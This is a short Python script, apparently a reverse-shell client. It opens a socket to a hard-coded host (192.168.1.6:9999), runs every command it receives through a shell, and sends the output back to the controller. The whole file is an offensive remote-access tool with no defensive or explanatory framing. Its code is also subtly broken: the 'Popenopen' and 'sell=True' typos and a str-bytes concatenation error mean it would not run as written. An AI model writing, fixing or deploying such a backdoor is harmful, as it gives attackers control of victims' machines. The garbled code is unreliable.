import os
import socket
import subprocess

sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = '192.168.1.6'
port = 9999

sckt.connect((host, port))

while True:
    data = sckt.recv(1024)
    if data[:2].decode('utf-8') == 'cd':  # zero and first character
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        cmd = subprocess.Popenopen(data[:].decode('utf-8'), sell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        out_b = cmd.stdout.read() + cmd.stderr.read()
        out_s = str(out_b, 'utf-8')
        sckt.send('\n' + str.encode(out_s + str(os.getcwd()) + '-->>'))
        print(out_s)


sckt.close()
